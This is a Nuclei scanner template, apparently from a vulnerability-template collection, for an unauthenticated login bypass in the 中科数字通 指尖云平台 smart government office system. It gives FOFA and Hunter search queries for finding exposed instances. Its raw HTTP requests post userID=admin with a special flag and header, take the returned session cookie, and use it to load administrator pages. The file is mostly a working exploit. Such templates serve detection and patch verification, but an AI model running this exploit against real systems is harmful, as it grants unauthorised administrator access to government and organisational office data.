id: sztbj-login-unauth
info:
  name: 数字通指尖云平台智慧政务 - unauth
  author: leadlife
  severity: high
  description: 中科数字通（北京）科技有限公司全新架构的智慧办公系统，由9大类、50多个主要功能模块构成。旨在为组织单位内部提供全新一代智慧型协同办公系统，数字通指尖云平台-智慧政务存在登录绕过漏洞
  reference: 
    - todo
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="assets/8cca19ff/css/bootstrap-yii.css"
    hunter-query: app.name="中科数字通 "
  tags: sztbj,unauth,oa

http:
  - raw:
      - |
        POST /portal/default/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Accept-Ldwk: bG91ZG9uZ3dlbmt1
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

        userID=admin&flag=rone
      
      - |+
        GET / HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{goasessid}}
      
      - |+
        GET /theme/concise HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{goasessid}}
        
    extractors:
      - type: regex
        part: header_1
        name: goasessid
        internal: true
        regex:
          - "Set-Cookie:.*?GOASESSID=([^;]+)"

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 302 && status_code_2 == 302
          - contains_all(body_3,'个人办公','公文管理','系统管理员')
        condition: and